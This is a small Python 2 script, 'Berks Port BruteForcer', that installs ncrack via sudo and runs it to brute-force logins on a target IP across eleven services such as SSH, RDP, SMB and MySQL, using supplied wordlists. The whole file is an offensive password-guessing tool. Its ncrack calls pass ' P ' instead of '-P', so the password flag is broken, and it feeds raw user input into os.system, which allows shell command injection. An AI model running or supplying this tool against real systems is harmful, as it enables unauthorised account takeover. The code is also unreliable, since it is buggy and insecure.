#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("sudo apt-get install figlet")
os.system("sudo apt-get install ncrack")
os.system("clear")
os.system("figlet Berks Port BruteForcer")
print("""
A special port bruteforcer with ncrack tool.

1) FTP
2) SSH
3) Telnet
4) HTTP
5) SMB
6) RDP
7) VNC
8) SIP
9) Redis
10) PostgreSQL
11) MySQL
""")

operno = raw_input("Operation number: ")
targetip = raw_input("Target IP: ")
username = raw_input("Username Wordlist: ")
password = raw_input("Password Wordlist: ")

if operno == '1':
	os.system("ncrack -p 21 -U " + username + " P " + password + " " + targetip)
	
elif operno == '2':
	os.system("ncrack -p 22 -U " + username + " P " + password + " " + targetip)
	
elif operno == '3':
	os.system("ncrack -p 23 -U " + username + " P " + password + " " + targetip)
	
elif operno == '4':
	os.system("ncrack -p 80 -U " + username + " P " + password + " " + targetip)
	
elif operno == '5':
	os.system("ncrack -p 445 -U " + username + " P " + password + " " + targetip)
	
elif operno == '6':
	os.system("ncrack -p 3389 -U " + username + " P " + password + " " + targetip)
	
elif operno == '7':
	os.system("ncrack -p 5900 -U " + username + " P " + password + " " + targetip)
	
elif operno == '8':
	os.system("ncrack -p 5060 -U " + username + " P " + password + " " + targetip)
	
elif operno == '9':
	os.system("ncrack -p 6379 -U " + username + " P " + password + " " + targetip)

elif operno == '10':
	os.system("ncrack -p 5432 -U " + username + " P " + password + " " + targetip)
	
elif operno == '11':
	os.system("ncrack -p 3306 -U " + username + " P " + password + " " + targetip)
	
else:
	print("\33[1;33;40m An error occured. Please try again later.")

















